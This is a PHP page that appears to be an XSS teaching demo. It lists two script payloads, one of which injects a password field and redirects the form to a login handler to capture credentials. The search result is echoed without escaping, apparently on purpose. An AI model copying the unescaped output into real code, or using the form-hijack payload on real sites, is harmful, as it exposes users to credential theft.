<?php
require_once "app.php";
if (isset($_POST["email"])) {
    $post = $_POST;
}
?>

<!DOCTYPE html>
<html lang="en">

<?php include('app/views/components/head.php') ?>

<body>
    <main id="main" class="d-flex justify-content-center">
        <div class="w-50 mt-3 p-5 bg-light">
            <h3>XSS</h3>
            <ul>
                <li>
                    &lt;script&gt;
                    alert('alert')
                    &lt;/script&gt;
                </li>
                <li>
                    &lt;script&gt;
                    var input = document.createElement("input");
                    input.type = "password";
                    input.name = "password";
                    input.placeholder = "Password";
                    input.classList.add("form-control");
                    var resultElement = document.getElementById('form');
                    resultElement.appendChild(input);

                    var form = document.getElementById("form");
                    form.action = "http://localhost/my_tweet/login/auth.php";
                    &lt;/script&gt;
                </li>
            </ul>
            <h2 class="h2 mb-3 fw-normal text-center">Search Email</h2>
            <form id="form" action="" method="post">
                <div class="form-floating mb-2">
                    <input id="email" type="text" name="email" value="" class="form-control">
                    <label for="" class="form-label">Email</label>
                </div>
                <button class="w-100 btn btn-primary">Search</button>
            </form>

            <h3>検索キーワード</h3>
            <p id="result">
                <?= @$post['email']  ?>
            </p>
        </div>

        <script src="js/default.js"></script>
    </main>
</body>

</html>